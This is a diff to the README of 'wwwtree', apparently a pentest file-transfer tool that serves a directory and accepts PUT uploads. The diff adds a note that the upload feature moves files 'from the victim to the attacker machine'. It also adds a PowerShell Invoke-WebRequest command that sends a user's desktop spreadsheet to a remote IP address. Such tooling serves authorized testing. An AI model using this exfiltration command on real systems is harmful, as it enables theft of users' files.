@@ -12,10 +12,10 @@ A utility for quickly and easily locating, web hosting and transferring resource
 
 ## Description
 wwwtree does the following:
- - hosts a specified root directory and prints the contents in a tree-like format. Every file is translated to it's equivalent server URL so you can quickly copy it and use a web client to transfer it to the victim.
- - Filters out files that contain specific substrings based on user provided keywords (use `-k` to parse comma seperated values).
+ - hosts a specified root directory and prints the contents in a tree-like format. Every file is translated to it's equivalent server URL path so you can quickly copy it and use a web client to transfer it to the victim.
+ - Filters out files that contain specific substrings based on user provided keywords (use `-k` to parse comma seperated values). Handy for quickly locating resources located in deep and populated directory structures.
  - Automatically hides from the output files and folders that are most likely not in the scope of enumeration / exploitation (e.g., txt, yml, docx files or .git directories). You can control this behaviour by editing the list variables `hide_extensions` and `hide_dirs` in the source.
- - The custom python http server powering this tool supports PUT requests and by default saves files in `/tmp` (you can change that in the source)
+ - The wwwtree python http server handler supports PUT requests and by default saves files in `/tmp` (you can change that in the source). You can use it to transfer files from the victim to the attacker machine.
 
 
 ## Installation & Usage
@@ -26,4 +26,10 @@ pip3 install -r requirements.txt
 chmod +x wwwtree.py
 
 wwwtree.py [-h] -r ROOT_PATH -i INTERFACE [-l LEVEL] [-p PORT] [-k KEYWORDS] [-A] [-q]
+```
+
+### PUT Requests
+I've noticed that curl on Windows seems to work improperly when trying to transfer large files. Powershell's `Invoke-WebRequest` works much better:
+```
+powershell -c "invoke-webrequest -method PUT -headers @{'Content-Type'='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'} -usebasicparsing -uri http://192.168.111.135/testt -body (get-content C:\Users\pxart\Desktop\some_file.xlsx)"
 ```
